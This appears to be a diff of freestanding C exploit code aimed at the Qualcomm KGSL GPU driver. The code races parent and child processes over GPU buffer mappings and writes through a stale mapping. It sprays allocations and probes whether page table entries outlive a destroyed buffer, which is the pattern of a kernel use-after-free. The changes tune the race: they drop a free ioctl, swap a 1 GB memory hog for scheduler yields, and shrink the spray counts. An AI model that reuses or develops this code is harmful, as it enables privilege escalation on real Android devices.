@@ -67,7 +67,7 @@ static u32 g_ts=1;
 static u32 g_bids[MAXB]; static u32*g_bcpu[MAXB]; static u64 g_bgpu[MAXB]; static int g_nb;
 static u64 g_regs[4096];
 static u32 g_hold[4096]; static int g_hold_n;
-#define REGIONS 2048
+#define REGIONS 1024
 
 static long alloc_buf(u64 size,u32 flags,u32*id,u64*gpu,u32**cpu){
     struct kgsl_gpumem_alloc_id a; for(u64 i=0;i<sizeof(a);i++)((u8*)&a)[i]=0;
@@ -191,8 +191,6 @@ void _start(void){
                 out("[R");outdec(round);out("] WIN parent=");outhex((u64)g_p_res);out(" child=");outhex((u64)g_c_res);out(" (cleanup, continue)\n");
                 sys2(SYS_munmap,(s64)g_p_res,g_fsz);
                 sys2(SYS_munmap,(s64)g_h1,0x1000);
-                struct kgsl_gpumem_free_id fw; fw.id=g_aid; fw.pad=0;
-                sys3(SYS_ioctl,g_fd,IOCTL_GPUMEM_FREE_ID,(s64)&fw);
                 continue;
             } else if((g_p_res>0) != (g_c_res>0)){
                 out("[R");outdec(round);out("] MIXED parent=");outhex((u64)g_p_res);out(" child=");outhex((u64)g_c_res);out("\n");
@@ -200,7 +198,7 @@ void _start(void){
                     u64 surv=(u64)g_c_res;
                     gpu_write(2,surv+0x100,0xDEADBEEFu);
                     g_hold_n=0;
-                    for(int q=0;q<4096;q++){ u32 hid; u64 hgpu; u32*hcp;
+                    for(int q=0;q<512;q++){ u32 hid; u64 hgpu; u32*hcp;
                         if(alloc_buf(ASZ,0,&hid,&hgpu,&hcp)) break;
                         if(g_hold_n<4096) g_hold[g_hold_n++]=hid;
                     }
@@ -216,12 +214,8 @@ void _start(void){
                         out("[R");outdec(round);out("] flavor a (PTEs unmapped at destroy) - skip\n");
                         continue;
                     }
-                    s64 hog=sys6(SYS_mmap,0,0x40000000,3,0x22,-1,0);
-                    if(hog>0){
-                        volatile unsigned char*hp=(volatile unsigned char*)hog;
-                        for(unsigned long long off=0;off<0x40000000ull;off+=0x1000) hp[off]=0x5A;
-                        out("[R");outdec(round);out("] pressure hog 1GB kept\n");
-                    } else out("[R");outdec(round);out("] hog mmap failed\n");
+                    for(int sp=0;sp<200;sp++) sys3(SYS_sched_yield,0,0,0);
+                    out("[R");outdec(round);out("] settle done\n");
                     int nr=0;
                     for(int q=0;q<REGIONS;q++){
                         s64 r=sys6(SYS_mmap,0,0x200000,3,0x22,-1,0);
@@ -265,7 +259,6 @@ void _start(void){
                         out("[R");outdec(round);out("] KGSL reclaim probe=");outdec(ra);
                         out(ra==1?"  (PTEs live; pages pooled not buddy)\n":"  (PTEs gone or unreclaimed)\n");
                     }
-                    if(hog>0) sys2(SYS_munmap,hog,0x40000000);
                     continue;
                 }
                 /* parent survivor: child's failed mmap; survivor mapping intact */
